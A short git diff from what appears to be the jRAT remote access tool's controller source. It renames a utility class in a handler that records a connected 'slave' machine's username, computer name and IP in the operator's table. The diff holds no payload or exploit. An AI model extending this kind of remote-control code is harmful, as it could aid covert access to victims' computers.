@@ -4,7 +4,7 @@ import java.io.DataInputStream;
 
 import pro.jrat.Slave;
 import pro.jrat.ui.frames.Frame;
-import pro.jrat.utils.Util;
+import pro.jrat.utils.Utils;
 
 
 public class Packet22InitUsername extends AbstractIncomingPacket {
@@ -13,7 +13,7 @@ public class Packet22InitUsername extends AbstractIncomingPacket {
 	public void read(Slave slave, DataInputStream dis) throws Exception {
 		String line = slave.readLine();
 		slave.setUsername(line);
-		Frame.mainModel.setValueAt(slave.getUsername() + "@" + slave.getComputerName(), Util.getRow(3, slave.getIP()), 5);
+		Frame.mainModel.setValueAt(slave.getUsername() + "@" + slave.getComputerName(), Utils.getRow(3, slave.getIP()), 5);
 	}
 
 }
